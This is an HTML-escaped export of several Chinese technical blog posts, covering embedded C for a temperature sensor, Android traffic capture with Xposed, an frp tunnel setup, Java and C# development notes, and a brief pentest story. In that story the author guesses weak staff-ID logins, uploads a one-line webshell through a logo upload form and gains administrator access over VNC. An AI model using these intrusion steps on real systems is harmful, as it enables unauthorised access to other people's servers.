&#x2F;&#x2F;设置GPJ4_4输出高电平\n\tGPJ4DAT&#x3D;0x1e;\n&#125;\nvoid led_init()\n&#123;\n\t&#x2F;&#x2F;GPJ2CON &#x3D; GPJ2CON &amp; 0xffffff00;  &#x2F;&#x2F;清除led灯1对应的控制引脚，即将低四位设置为0000\n\t&#x2F;&#x2F;GPJ2CON &#x3D; GPJ2CON | 0x11111111;\t\t&#x2F;&#x2F;设置低四位为0001，即设置为输出模式\n\tGPJ2CON&#x3D;0x11111111;\n\tGPD0CON&#x3D;0x11111111;\n&#125;\n \nunsigned char key_scan()&#123;\n\tunsigned char i,temp;\n\tGPJ4DAT&#x3D;0x1e;\n\tif(GPJ1DAT)&#123;\n\t\tswitch (GPJ1DAT)\n\t\t&#123;\n\t\t\tcase 0b00000001:&#123;\n\t\t\t\ttemp&#x3D;0b00111100;\n\t\t\t\tfor(i&#x3D;0;i&lt;4;i++)&#123;\n\t\t\t\t\tGPJ4DAT&#x3D;temp;\n\t\t\t\t\tif(!GPJ1DAT)&#123;\n\t\t\t\t\t\treturn i+1;\n\t\t\t\t\t&#125;\n\t\t\t\t\ttemp&#x3D;temp&lt;&lt;1;\n\t\t\t\t&#125;\n\t\t\t&#125;break;\n\t\t\tcase 0b00000010:&#123;\n\t\t\t\ttemp&#x3D;0b00111100;\n\t\t\t\tfor(i&#x3D;0;i&lt;4;i++)&#123;\n\t\t\t\t\tGPJ4DAT&#x3D;temp;\n\t\t\t\t\tif(!GPJ1DAT)&#123;\n\t\t\t\t\t\treturn (i+1)+4*1;\n\t\t\t\t\t&#125;\n\t\t\t\t\ttemp&#x3D;temp&lt;&lt;1;\n\t\t\t\t&#125;\n\t\t\t&#125;break;\n\t\t\tcase 0b00000100:&#123;\n\t\t\t\ttemp&#x3D;0b00111100;\n\t\t\t\tfor(i&#x3D;0;i&lt;4;i++)&#123;\n\t\t\t\t\tGPJ4DAT&#x3D;temp;\n\t\t\t\t\tif(!GPJ1DAT)&#123;\n\t\t\t\t\t\treturn (i+1)+4*2;\n\t\t\t\t\t&#125;\n\t\t\t\t\ttemp&#x3D;temp&lt;&lt;1;\n\t\t\t\t&#125;\n\t\t\t&#125;break;\n\t\t\tcase 0b00001000:&#123;\n\t\t\t\ttemp&#x3D;0b00111100;\n\t\t\t\tfor(i&#x3D;0;i&lt;4;i++)&#123;\n\t\t\t\t\tGPJ4DAT&#x3D;temp;\n\t\t\t\t\tif(!GPJ1DAT)&#123;\n\t\t\t\t\t\treturn (i+1)+4*3;\n\t\t\t\t\t&#125;\n\t\t\t\t\ttemp&#x3D;temp&lt;&lt;1;\n\t\t\t\t&#125;\n\t\t\t&#125;break;\n\t\t\tdefault:return 0;\n\t\t&#125;\n\t&#125;\n\treturn 0;\n&#125;\n \nvoid main()\n&#123;\n\tunsigned short temp;\n\tkey_init();\n\tled_init();\n\twhile(1)&#123;\n \n\t\t&#x2F;&#x2F;GPJ2DAT&#x3D;(DS18B20DAT&amp;0b10000000)?0xff:0x00;\n \n\t\t&#x2F;&#x2F;Delay_NS(1000000);\n\t\t&#x2F;&#x2F;for(i&#x3D;1150000;i&gt;0;i--);\n\t\t&#x2F;&#x2F;delayUS(1000000);\n\t\ttemp&#x3D;readTemp();\n\t\tif(temp&gt;30)&#123;\n\t\t\tGPD0DAT&#x3D;0XFF;\n\t\t\tGPJ2DAT&#x3D;0x00;\n\t\t&#125;\n\t\telse&#123;\n\t\t\tGPD0DAT&#x3D;0X00;\n\t\t\tGPJ2DAT&#x3D;0xff;\n\t\t&#125;\n\t\tDelay_ms(500);\n\t\t&#x2F;&#x2F;GPJ2DAT&#x3D;!GPJ2DAT;\n\t\tprintf(&quot;%d...\\n&quot;,temp);\n\t\t;\n \n\t&#125;\n \n&#125;\n最终效果由于本设计的重点在于数据的读取，所以仅处理了整数部分，小数部分直接丢弃了。。。。博客迁移，图片丢失～\n","slug":"ARM-Contex-A8-ds18b20","date":"2021-07-03T06:52:19.000Z","categories_index":"开发,硬件,硬件,裸机","tags_index":"开发,嵌入式,三星s5pv210","author_index":"Pa2sw0rd"},{"id":"67d8ae1d1f1daed3c8c63c2c5fb3c2f3","title":"Android无需脱壳/逆向抓取加密包","content":"环境准备1、夜神安卓模拟器（Android版本5.1.1）\n2、Xposed框架（应用商店即可下载）\n3、Xserver（https://github.com/monkeylord/XServer）\n遇到的坑1、安装完Xposed提示未安装，可点击“version89”-&gt;“install”进行安装\n2、安装完Xserver并在Xposed中勾选后并不能使用，重启设备即可解决\n使用步骤1、准备完环境后打开Xserver，点击“select app”，并选择目标APP\n2、进行ADB端口转发，将Xserver转发到本地端口\nadb forward tcp:8000 tcp:8000\n3、本地浏览器打开http://127.0.0.1:8000\n","slug":"android-not-unpack-packet","date":"2021-06-24T06:25:12.000Z","categories_index":"安全,环境搭建,环境搭建,抓包","tags_index":"Android,抓包","author_index":"Pa2sw0rd"},{"id":"78b1b1fd98036cc5c20194494c7acf61","title":"树莓派家庭宽带内网穿透","content":"突然发现我在家里的树莓派不通了，回家一看，原来是电信把公网IP给回收了，emmmm，无奈，使用vps做一下内网穿透(博客迁移，图片丢失～)。\n准备环境1、树莓派（可连接互联网）\n2、VPS（这里使用腾讯轻应用服务器，系统Ubuntu）\n服务端配置1、从GitHub下载软件\nwget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.34.3&#x2F;frp_0.34.3_freebsd_amd64.tar.gz\n2、解压包\ntar vxf frp_0.34.3_freebsd_amd64.tar.gz\n3、修改配置文件（frps.ini）\nbind_port &#x3D; 7000\n#客户端连接端口\ndashboard_port&#x3D;7500\n#WEB页面端口\ndashboard_user&#x3D;user\n#WEB端用户名\ndashboard_pwd&#x3D;pass\n#WEB端密码\nauthentication_method&#x3D;token\ntoken&#x3D;*****#客户端连接token\n3、保存配置文件并配置VPS防火墙规则，放行相关端口\n4、启动服务程序\n.&#x2F;frps -c frps.ini#前台启动，关闭终端会停止服务\nnohup .&#x2F;frps -c frps.ini &amp; #后台启动服务\n配置客户端1、从GitHub下载软件（注意树莓派的架构为arm）\nsudo wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.34.3&#x2F;frp_0.34.3_linux_arm.tar.gz\n2、解压包\n3、修改客户端配置文件（frpc.ini）\nserver_addr &#x3D; xx.xx.xx.xx#服务器地址\nserver_port &#x3D; 7000\n#服务器端口\ntoken &#x3D; *****#服务器token\n \n#需要映射的端口\n[ssh]\ntype &#x3D; tcp\nlocal_ip &#x3D; 127.0.0.1\n#内网地址\nlocal_port &#x3D; 22\n#本地端口\nremote_port &#x3D; 7022#远程端口\n4、启动并测试，注意软件架构不对是无法运行的\n.&#x2F;frpc -c frpc.ini\n5、配置客户端开机自启\n创建文件“&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;frpc.service”，添加以下内容\n[Fusion]\nDescription&#x3D;Frp Server\nAfter&#x3D;syslog.target network.target\nWants&#x3D;network.target\n \n[Service]\nType&#x3D;simple\nExecStart&#x3D;&#x2F;bin&#x2F;frp_0.34.3_linux_arm&#x2F;frpc -c &#x2F;bin&#x2F;frp_0.34.3_linux_arm&#x2F;frpc.ini\nExecStop&#x3D;&#x2F;usr&#x2F;bin&#x2F;killall frpc\n#启动失败1分钟后再次启动\nRestartSec&#x3D;1min\nKillMode&#x3D;control-group\n#重启控制，总是重启\nRestart&#x3D;always\n \n[Install]\nWantedBy&#x3D;multi-user.target\nsudo systemctl enable frpc.service#开机自启\nsudo systemctl start frpc.service#启动服务\nsudo systemctl status frpc.service#查看状态\n","slug":"raspberrypi-intranet-penetration","date":"2020-12-27T13:47:22.000Z","categories_index":"记录,内网穿透","tags_index":"树莓派,内网穿透","author_index":"Pa2sw0rd"},{"id":"43146c96a367affc1b1b33406c790325","title":"实验室管理系统的渗透测试","content":"本来打算在web页面找漏洞，发现并不是很好找，因为是内网服务器，于是直接扫描目标开放端口(博客迁移，图片丢失～)\n其中8080是给用户的一个页面，普通用户可以登录预约实验室登操作；\n8081为管理员登录页面，管理员登录进去后可以修改系统配置\n还记得上次资产管理系统的用户名爆破（http://127.0.0.1/archives/11）吗？这种系统账号密码一般都是老师的工号，于是随便找一个工号登录系统。\n一般情况下我们都是找上传页面上传后门，发现可以在添加友情链接的LOGO上传处上传任意文件。于是上传一句话，拿出菜刀。\n额，权限不是很高，而且有杀毒软件。本来想着想个办法提权，但是翻腾了一下文件之后，发现管理员的安全意识有点低啊，数据库，其它服务器登配置文件都在这个机子上，远程管理用的是vnc，于是Administrator直接登录。。。\n最后说一下，不管是什么服务器，运行什么服务，都不要使用弱口令，特别是默认账号密码，而且一些密码等敏感配置文件不要直接放在服务器。\n","slug":"laboratory-managesystem-pentest","date":"2020-11-01T11:32:38.000Z","categories_index":"安全,渗透测试,渗透测试,web","tags_index":"渗透测试","author_index":"Pa2sw0rd"},{"id":"d8f21b6acd8e420407a15a9560e34188","title":"使用VSCODE搭建JavaWeb开发环境","content":"准备工具：\nvscode\nJDK\ntomcat\nmaven\n\n环境搭建：这里就不说Java环境变量了，自行配置，下载并安装vscode，安装以下插件：\n\nTomcat for Java;\nMaven for Java;\n其余前端及java代码提示工具，根据自己习惯安装配置maven for java插件：\n\nVSCODE-file-preferences-settings-搜索maven\n配置settings文件路径：\n配置执行文件路径：\n到这里基本可以创建工程文件了，如果没有科学上网环境，需要配置一下国内仓库，否则会一直卡住，如果按照网上传统的方法添加执行参数，还是会报错，最终通过此方法解决\n打开maven目录&#x2F;conf下面的settings配置文件，在mirrors节点下加入以下内容：\n&lt;mirror&gt;\n      &lt;id&gt;alimaven&lt;&#x2F;id&gt;\n      &lt;name&gt;aliyun maven&lt;&#x2F;name&gt;\n      &lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt;\n      &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;\n    &lt;&#x2F;mirror&gt;\n    &lt;mirror&gt;\n      &lt;id&gt;uk&lt;&#x2F;id&gt;\n      &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;\n      &lt;name&gt;Human Readable Name for this Mirror.&lt;&#x2F;name&gt;\n      &lt;url&gt;http:&#x2F;&#x2F;uk.maven.org&#x2F;maven2&#x2F;&lt;&#x2F;url&gt;\n    &lt;&#x2F;mirror&gt;\n    &lt;mirror&gt;\n      &lt;id&gt;CN&lt;&#x2F;id&gt;\n      &lt;name&gt;OSChina Central&lt;&#x2F;name&gt;\n      &lt;url&gt;http:&#x2F;&#x2F;maven.oschina.net&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt;\n      &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;\n    &lt;&#x2F;mirror&gt;\n    &lt;mirror&gt;\n      &lt;id&gt;nexus&lt;&#x2F;id&gt;\n      &lt;name&gt;internal nexus repository&lt;&#x2F;name&gt;\n      &lt;url&gt;http:&#x2F;&#x2F;repo.maven.apache.org&#x2F;maven2&lt;&#x2F;url&gt;\n      &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;\n    &lt;&#x2F;mirror&gt;\n    &lt;mirror&gt;      \n        &lt;id&gt;repo2&lt;&#x2F;id&gt;      \n        &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;      \n        &lt;name&gt;Human Readable Name for this Mirror.&lt;&#x2F;name&gt;      \n        &lt;url&gt;http:&#x2F;&#x2F;repo2.maven.org&#x2F;maven2&#x2F;&lt;&#x2F;url&gt;      \n    &lt;&#x2F;mirror&gt;      \n    &lt;mirror&gt;      \n        &lt;id&gt;net-cn&lt;&#x2F;id&gt;      \n        &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;      \n        &lt;name&gt;Human Readable Name for this Mirror.&lt;&#x2F;name&gt;      \n        &lt;url&gt;http:&#x2F;&#x2F;maven.net.cn&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt;       \n    &lt;&#x2F;mirror&gt;      \n    &lt;mirror&gt;      \n        &lt;id&gt;ibiblio&lt;&#x2F;id&gt;      \n        &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;      \n        &lt;name&gt;Human Readable Name for this Mirror.&lt;&#x2F;name&gt;      \n      &lt;url&gt;http:&#x2F;&#x2F;mirrors.ibiblio.org&#x2F;pub&#x2F;mirrors&#x2F;maven2&#x2F;&lt;&#x2F;url&gt;      \n    &lt;&#x2F;mirror&gt;      \n    &lt;mirror&gt;      \n        &lt;id&gt;jboss-public-repository-group&lt;&#x2F;id&gt;      \n        &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;      \n        &lt;name&gt;JBoss Public Repository Group&lt;&#x2F;name&gt;      \n      &lt;url&gt;http:&#x2F;&#x2F;repository.jboss.org&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&lt;&#x2F;url&gt;      \n    &lt;&#x2F;mirror&gt;    \n    &lt;mirror&gt;      \n        &lt;id&gt;JBossJBPM&lt;&#x2F;id&gt;  \n        &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;  \n        &lt;name&gt;JBossJBPM Repository&lt;&#x2F;name&gt;  \n        &lt;url&gt;https:&#x2F;&#x2F;repository.jboss.org&#x2F;nexus&#x2F;content&#x2F;repositories&#x2F;releases&#x2F;&lt;&#x2F;url&gt;  \n    &lt;&#x2F;mirror&gt;  \n      &lt;mirror&gt;      \n        &lt;id&gt;antelink&lt;&#x2F;id&gt;  \n        &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;  \n        &lt;name&gt;antelink Repository&lt;&#x2F;name&gt;  \n        &lt;url&gt;http:&#x2F;&#x2F;maven.antelink.com&#x2F;content&#x2F;repositories&#x2F;central&#x2F;&lt;&#x2F;url&gt;  \n    &lt;&#x2F;mirror&gt;  \n    &lt;mirror&gt;      \n        &lt;id&gt;openkoala&lt;&#x2F;id&gt;  \n        &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;  \n        &lt;name&gt;openkoala Repository&lt;&#x2F;name&gt;  \n        &lt;url&gt;http:&#x2F;&#x2F;nexus.openkoala.org&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;Koala-release&#x2F;&lt;&#x2F;url&gt;  \n    &lt;&#x2F;mirror&gt;  \n    &lt;mirror&gt;      \n        &lt;id&gt;tmatesoft&lt;&#x2F;id&gt;  \n        &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;  \n        &lt;name&gt;tmatesoft Repository&lt;&#x2F;name&gt;  \n        &lt;url&gt;http:&#x2F;&#x2F;maven.tmatesoft.com&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt;  \n    &lt;&#x2F;mirror&gt;  \n    &lt;mirror&gt;      \n        &lt;id&gt;mavensync&lt;&#x2F;id&gt;  \n        &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;  \n        &lt;name&gt;mavensync Repository&lt;&#x2F;name&gt;  \n        &lt;url&gt;http:&#x2F;&#x2F;mavensync.zkoss.org&#x2F;maven2&#x2F;&lt;&#x2F;url&gt;  \n    &lt;&#x2F;mirror&gt;\n到这里环境就基本配置完成。\n创建工程：VSCODE Ctrl+shift+P，输入maven，选择create…..,创建webapp\n选择最新版本，然后选择工程目录，后续输入项目名称，版本之类的可以直接回车跳过\n可以自行创建 java, test, resources等目录，其中java文件夹用来存放java文件, resources用来存放资源文件(maven编译时会识别文件夹名所以必须要叫resources, 不然就要在pom.xml中手动配置资源文件夹)，最终目录结构如下：\n至此工程已创建完毕\n运行工程：首先需要打包，建议用maven打包，用tomcat打包的话会出现404错误，不知道是什么原因造成的\nCtrl+shift+p-输入maven-execute commands-package,执行后在target文件夹下会生成war包，鼠标单击war包，点击run on tomcat server，如果是第一次，会要求你选择tomcat目录\n完了之后在vscode左边explorer里面点击tomcat servers\n点击 open in browser或者直接浏览器打开http://127.0.0.1:8080/包名称，即可查看运行结果：\n","slug":"vscode-javaweb-env","date":"2020-10-26T11:11:36.000Z","categories_index":"开发,环境搭建,环境搭建,Java web","tags_index":"开发,环境搭建,JavaWeb","author_index":"Pa2sw0rd"},{"id":"399c080512ffd5c4a1241cf968e7b025","title":"C4D python使用第三方库","content":"最近想做一个用硬件控制3d对象的demo，打算使用c4d，了解了一下C4D的python脚本，发现这方面的资料国内挺少的，最头疼的问题是不知道如何安装库，我们一般情况下直接在console里用pip安装就行了，但是发现C4D的python是独立的。。。。emmm，想了一个办法，系统装python，然后pip安装库，然后复制库到C4D的python，这听起来有点。。。。没办法，网上又没有相关的资料(博客迁移，图片丢失～)\n首先看一下自己系统python库的路径，我的是\nC:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python38\\Lib\\site-packages\n然后下载你要装的库，这里以串口库为例\npip install pyserial\n额，因为我已经安装了，所以warning。。。。然后在系统python库文件夹里复制相关文件夹\n同样在C4D里，打开脚本编辑器，用同样的方式(sys.path)找到C4D python的库文件夹，并把刚才复制的东西复制过去就可以了\n如果你有其它方式，可以留言告诉我一下\n","slug":"c4d-use-python-other-library","date":"2020-07-30T13:46:53.000Z","categories_index":"记录,环境配置","tags_index":"python,C4D","author_index":"Pa2sw0rd"},{"id":"b9dfc951b7f818ca7902fed80877a28b","title":"温湿度数据可视化","content":"这是一个帮一个学姐完善的毕业设计，由于她之前找人做的时候一次性付清了钱，导致后来导师要求加功能的时候卖家不理人，所以有了此文章(博客迁移，图不见了～)，来说一下实现的思路吧。\n他这个要求远程采集三个节点的温湿度数据，并通过终端节点通过串口发送到PC上，硬件电路，数据采集与zigbee组网商家已经实现了，我主要帮他在PC上实现一个数据可视化。\n首先想到了几个方案：1、写一个上位机，实时接收串口数据，利用画图组件描点连线，就OK了。2、直接用网页接受串口数据，用现成开源的echarts数据可视化库实现。3、搞个服务器，写几个接口，PC的上位机作为客户端连接服务器发送温湿度数据，服务器端用echarts实现数据可视化，用户可访问网页来查看数据。因为时间问题，只有一天，所以简单粗暴，不考虑那么多了，直接C#写个上位机，并建立websocket服务端，本地网页js连接websocket服务端进行数据的接收，再用echarts实现数据可视化，本来上位机打算用易语言，但是考虑是毕业设计，写在报告里有点傻*，所以就正式一点，用了C#。。。\n界面就不说了，几个常规组件，一个串口组件用来接收串口数据，系统串口检索直接使用api-GetPortNames获取系统串口列表，然后依次遍历并实例化每个串口对象，串口列表遍历代码如下：\nprivate void MyInit()\n        &#123;\n            this.serialPorts &#x3D; new List&lt;SerialPort&gt;();\n            this.portNames &#x3D; SerialPort.GetPortNames();\n            this.portBuffer &#x3D; new byte[1000];\n            if (this.portNames.Length &gt; 1)\n            &#123;\n                for (int i &#x3D; 0; i &lt; this.portNames.Length; i++)\n                &#123;\n                    this.serialPorts.Add(new SerialPort(this.portNames[i]));\n                &#125;\n            &#125;\n            this.comboBox1.Items.Clear();\n            this.comboBox2.Items.Clear();\n            this.comboBox1.Items.AddRange(this.portNames);\n            this.comboBox2.Items.AddRange(this.btl);\n            this.comboBox3.Items.AddRange(this.sjw );\n            this.comboBox4.Items.AddRange(this.tzw);\n            this.comboBox5.Items.AddRange(this.jy);\n \n            try\n            &#123;\n                \n                this.comboBox2.SelectedIndex &#x3D; 1;\n                this.comboBox3.SelectedIndex &#x3D; 0;\n                this.comboBox4.SelectedIndex &#x3D;0;\n                this.comboBox5.SelectedIndex &#x3D; 0;\n                this.comboBox1.SelectedIndex &#x3D; 0;\n            &#125;\n            catch(Exception eio)\n            &#123;\n \n            &#125;\n            \n        &#125;\n点击开启按钮时从选择框当前选中项的名称从上次实例化的串口对象列表里获取当前选中的串口对象，然后打开串口，代码如下：\nprivate void button1_Click(object sender, EventArgs e)\n        &#123;\n            &#x2F;&#x2F;ms.My_send(&quot;abcd&quot;);\n            if (button1.Text.Equals(&quot;开启&quot;))\n            &#123;\n                try\n                &#123;\n                    this.serialPort1.PortName &#x3D; this.comboBox1.SelectedItem.ToString();\n                    Console.WriteLine(this.serialPort1.PortName);\n                    if (this.serialPort1.IsOpen)\n                    &#123;\n                        MessageBox.Show(&quot;串口被占用！&quot;);\n                        return;\n                    &#125;\n                    else\n                    &#123;\n                        this.serialPort1.BaudRate &#x3D;int.Parse(this.comboBox2.SelectedItem.ToString());\n                        this.serialPort1.DataBits &#x3D; int.Parse(this.comboBox3.SelectedItem.ToString());\n                        this.serialPort1.Parity &#x3D; Parity.None;\n                        this.serialPort1.StopBits &#x3D; StopBits.One;\n                        this.serialPort1.Open();\n                        this.button1.Text &#x3D; &quot;关闭&quot;;\n                    &#125;\n                &#125;\n                catch (Exception eio)\n                &#123;\n                    MessageBox.Show(&quot;出现异常：&quot;+eio.Message);\n                &#125;\n            &#125;\n            else if (button1.Text.Equals(&quot;关闭&quot;))\n            &#123;\n                this.serialPort1.Close();\n                this.button1.Text &#x3D; &quot;开启&quot;;\n            &#125;\n        &#125;\n当开启串口后，在串口接收事件中根据卖家提供的说明进行数据的接收处理，代码如下：\nprivate void serialPort1_DataReceived(object sender, SerialDataReceivedEventArgs e)\n        &#123;\n            &#x2F;&#x2F;Thread.Sleep(50);\n            int n &#x3D; serialPort1.BytesToRead;&#x2F;&#x2F;先记录下来，避免丢失\n            byte[] buf &#x3D; new byte[n];\n            serialPort1.Read(buf, 0, n);&#x2F;&#x2F;读取缓冲区数据\n            if (n &#x3D;&#x3D; 12)\n            &#123;\n                switch (buf[0])\n                &#123;\n                    case 0x01: &#123;\n                            wendu_1 &#x3D; (buf[1] - 0x30) * 10 + (buf[2] - 0x30);\n                            shidu_1&#x3D;(buf[3]-0x30)*10+ (buf[4] - 0x30);\n                            guangzhao_1&#x3D; (buf[5] - 0x30) * 100 + (buf[6] - 0x30)*10 + (buf[7] - 0x30);\n                            this.label6.Text &#x3D; &quot;节点1：温度：&quot; + wendu_1.ToString() + &quot;℃；湿度：&quot; + shidu_1.ToString() + &quot;％；光照：&quot;+guangzhao_1.ToString();\n                        &#125;\n                        break;\n                    case 0x02:\n                        &#123;\n                            wendu_2 &#x3D; (buf[1] - 0x30) * 10 + (buf[2] - 0x30);\n                            shidu_2 &#x3D; (buf[3] - 0x30) * 10 + (buf[4] - 0x30);\n                            guangzhao_2 &#x3D; (buf[5] - 0x30) * 100 + (buf[6] - 0x30) * 10 + (buf[7] - 0x30);\n                            this.label7.Text &#x3D; &quot;节点2：温度：&quot; + wendu_2.ToString() + &quot;℃；湿度：&quot; + shidu_2.ToString() + &quot;％；光照：&quot; + guangzhao_2.ToString();\n                        &#125;\n                        break;\n                    case 0x03:\n                        &#123;\n                            wendu_3 &#x3D; (buf[1] - 0x30) * 10 + (buf[2] - 0x30);\n                            shidu_3 &#x3D; (buf[3] - 0x30) * 10 + (buf[4] - 0x30);\n                            guangzhao_3 &#x3D; (buf[5] - 0x30) * 100 + (buf[6] - 0x30) * 10 + (buf[7] - 0x30);\n                            this.label8.Text &#x3D; &quot;节点3：温度：&quot; + wendu_3.ToString() + &quot;℃；湿度：&quot; + shidu_3.ToString() + &quot;％；光照：&quot; + guangzhao_3.ToString();\n                        &#125;\n                        break;\n                &#125;\n            &#125;\n            &#x2F;*遍历收到的字节\n            foreach (byte b in buf)\n            &#123;\n                Console.WriteLine(b.ToString(&quot;X2&quot;) + &quot; &quot;);\n            &#125;\n            *&#x2F;\n        &#125;\n上面这是串口数据的接收处理部分，下面来说一下websocket服务端的实现，这个就比较简单了，使用C#的websocketsharp库，根据说明，先写了一个自己的类继承了WebSocketBehavior，然后初始化websocket服务器，初始化就三句代码：\nWebSocketServer _ws &#x3D; new WebSocketServer(1234);\n_ws.AddWebSocketService&lt;MyWs&gt;(&quot;&#x2F;cshnet&quot;);\n_ws.Start();\n因为服务端是被动发送，当js端请求时才会发送数据，所以仅仅重写了OnMessage方法，具体代码如下：\nusing MyApp;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\nusing WebSocketSharp;\nusing WebSocketSharp.Server;\n \npublic class MyWs : WebSocketBehavior\n&#123;\n    protected override void OnMessage(MessageEventArgs e)\n    &#123;\n        &#x2F;&#x2F;JsonConvert.SerializeObject();\n \n        Console.WriteLine(e.Data);\n        Sessions.Broadcast(Encoding.UTF8.GetBytes(&quot;&#123;\\&quot;temperature1\\&quot;:&quot;+Form1.wendu_1.ToString()+ &quot;,\\&quot;temperature2\\&quot;:&quot; + Form1.wendu_2.ToString() + &quot;,\\&quot;temperature3\\&quot;:&quot; + Form1.wendu_3.ToString() + &quot;,\\&quot;Illumination1\\&quot;:&quot; + Form1.guangzhao_1.ToString() + &quot;,\\&quot;Illumination2\\&quot;:&quot; + Form1.guangzhao_2.ToString() + &quot;,\\&quot;Illumination3\\&quot;:&quot; + Form1.guangzhao_3.ToString() + &quot;,\\&quot;humidity1\\&quot;:&quot; + Form1.shidu_1.ToString() + &quot;,\\&quot;humidity2\\&quot;:&quot; + Form1.shidu_2.ToString() + &quot;,\\&quot;humidity3\\&quot;:&quot; + Form1.shidu_3.ToString() + &quot;,\\&quot;date\\&quot;:\\&quot;&quot; + DateTime.Now.ToLongTimeString().ToString() + &quot;\\&quot;&#125;&quot;));\n    &#125;\n    protected override void OnOpen()\n    &#123;\n        &#x2F;&#x2F;Console.WriteLine(Sessions.ActiveIDs);\n    &#125;\n \n    public static void My_send(String data)\n    &#123;\n        &#x2F;*\n        foreach (string i in Sessions.IDs)&#123;\n            Sessions.SendTo(Convert.FromBase64String(data), i);\n        &#125;*&#x2F;\n        &#x2F;&#x2F;Sessions.Broadcast(Encoding.UTF8.GetBytes(data));\n        &#x2F;&#x2F;WebSocketBehavior.Sessions.Broadcast(Encoding.UTF8.GetBytes(data));\n    &#125;\n \n \n&#125;\n上面就是上位机软件的实现方法，下面来说一下数据可视化的部分，首先下载echarts库，页面写几个div就不用管了，直接实现js代码即可，因为客户端是主动的，所以用了一个定时器，每隔一段时间从websocket服务端获取数据，通过websocket接受函数，将数据存到缓冲区，然后使用echarts的setOption方法更新数据，具体代码如下：\nvar num &#x3D; 50; &#x2F;&#x2F;要展示的数据量\nvar time &#x3D; 1500; &#x2F;&#x2F;数据更新时间ms\nvar connection_flag &#x3D; false;\nvar data &#x3D; &#123;\n    date: [],\n    temperature1: [],\n    temperature2: [],\n    temperature3: [],\n \n    Illumination1: [],\n    Illumination2: [],\n    Illumination3: []\n \n    &#x2F;&#x2F;hum1:0 ,\n    &#x2F;&#x2F;hum2:0 ,\n    &#x2F;&#x2F;hum3:0    \n&#125;;\nvar hum1&#x3D;0,hum2&#x3D;0,hum3&#x3D;0;\nvar options &#x3D; &#123;\n    Tem_options: &#123;\n        title: &#123;\n            text: &#39;各节点温度变化&#39;,\n            &#x2F;&#x2F;left: &#39;center&#39;\n        &#125;,\n        tooltip: &#123;&#125;,\n        legend: &#123;\n            data: [&#39;节点一&#39;, &#39;节点二&#39;, &#39;节点三&#39;]\n        &#125;,\n        xAxis: &#123;\n            type: &#39;category&#39;,\n            boundaryGap: false,\n            data: data.date\n        &#125;,\n        yAxis: &#123;\n            boundaryGap: [0, &#39;50%&#39;],\n            type: &#39;value&#39;\n        &#125;,\n        series: [&#123;\n            name: &quot;节点一&quot;,\n            type: &#39;line&#39;,\n \n            data: data.temperature1\n        &#125;, &#123;\n            name: &quot;节点二&quot;,\n            type: &#39;line&#39;,\n            data: data.temperature2\n        &#125;, &#123;\n            name: &quot;节点三&quot;,\n            type: &#39;line&#39;,\n            data: data.temperature3\n        &#125;]\n \n    &#125;,\n \n    Ill_options: &#123;\n        title: &#123;\n            text: &#39;各节点光照变化&#39;,\n            &#x2F;&#x2F;left: &#39;center&#39;\n        &#125;,\n        tooltip: &#123;&#125;,\n        legend: &#123;\n            data: [&#39;节点一&#39;, &#39;节点二&#39;, &#39;节点三&#39;]\n        &#125;,\n        xAxis: &#123;\n            type: &#39;category&#39;,\n            boundaryGap: false,\n            data: data.date\n        &#125;,\n        yAxis: &#123;\n            boundaryGap: [0, &#39;50%&#39;],\n            type: &#39;value&#39;\n        &#125;,\n        series: [&#123;\n            name: &quot;节点一&quot;,\n            type: &#39;line&#39;,\n \n            data: data.Illumination1\n        &#125;, &#123;\n            name: &quot;节点二&quot;,\n            type: &#39;line&#39;,\n            data: data.Illumination2\n        &#125;, &#123;\n            name: &quot;节点三&quot;,\n            type: &#39;line&#39;,\n            data: data.Illumination3\n        &#125;]\n \n    &#125;,\n \n    Hum1_options:&#123;\n        tooltip: &#123;\n            formatter: &#39;&#123;a&#125; &lt;br&#x2F;&gt;&#123;b&#125; : &#123;c&#125;%&#39;\n        &#125;,\n        toolbox: &#123;\n            feature: &#123;\n                restore: &#123;&#125;,\n                saveAsImage: &#123;&#125;\n            &#125;\n        &#125;,\n        series: [\n            &#123;\n                name: &#39;节点一&#39;,\n                type: &#39;gauge&#39;,\n                detail: &#123;formatter: &#39;&#123;value&#125;%&#39;&#125;,\n                data: [&#123;value: hum1, name: &#39;湿度1&#39;&#125;]\n            &#125;\n        ]\n    &#125;,\n \n    Hum2_options:&#123;\n        tooltip: &#123;\n            formatter: &#39;&#123;a&#125; &lt;br&#x2F;&gt;&#123;b&#125; : &#123;c&#125;%&#39;\n        &#125;,\n        toolbox: &#123;\n            feature: &#123;\n                restore: &#123;&#125;,\n                saveAsImage: &#123;&#125;\n            &#125;\n        &#125;,\n        series: [\n            &#123;\n                name: &#39;节点二&#39;,\n                type: &#39;gauge&#39;,\n                detail: &#123;formatter: &#39;&#123;value&#125;%&#39;&#125;,\n                data: [&#123;value: hum2, name: &#39;湿度2&#39;&#125;]\n            &#125;\n        ]\n    